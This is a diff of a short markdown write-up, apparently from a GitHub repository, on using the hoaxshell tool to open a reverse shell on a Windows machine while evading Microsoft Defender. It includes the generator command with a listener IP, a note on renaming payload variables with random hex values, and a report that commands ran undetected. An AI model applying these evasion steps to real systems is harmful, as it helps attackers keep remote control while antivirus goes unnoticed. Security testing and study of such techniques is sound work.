@@ -17,10 +17,10 @@ I used this command,
 ```
 ./hoaxshell.py -s 192.168.50.46 -r -H 'Authorization'
 ```
-`
+
 -r = raw payload
 -H = additional hoaxshell tag to bypass defender
-`
+
 
 # 2. and then it will spit out this shell here
 
@@ -51,11 +51,10 @@ uuid.uuid4().hex
 for i in range(10):
 uuid.uuid4().hex
 
-## ```
+
 ![2-3](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/0552328b-5e21-4b7b-b59f-d6d3b180066f)
 
 
-## ```
 
 # 4. and then I opened sublime text to edit some variables ,
 I changed 7 variables from the raw payload before, to look like this,
@@ -67,20 +66,19 @@ I changed 7 variables from the raw payload before, to look like this,
 # 5. and then I tested it in my victim machine with Microsoft Defender
 active , and it WORKS!!!
 
-```
+
 ![2-5](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/4b857298-8967-4d0d-be16-d95955772431)
 
-
-## ```
 
 I waited for 15mins to check if I would be disconnected.... I noticed that I
 am not getting disconnected even when I am executing commands like
 ipconfig,sysinfo,whoami etc... , The only time I got disconnected was
 when I created a file in the desktop folder
-```
+
 ![2-6](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/21268880-ba81-46e8-89ef-155e251011be)
 
-## ```
 
+However, I got disconnected a few minutes I created a text file inside a desktop folder..
+I think thats it for hoaxshell for now and will try some other command and control shell 
 
-
+# Thank you for reading
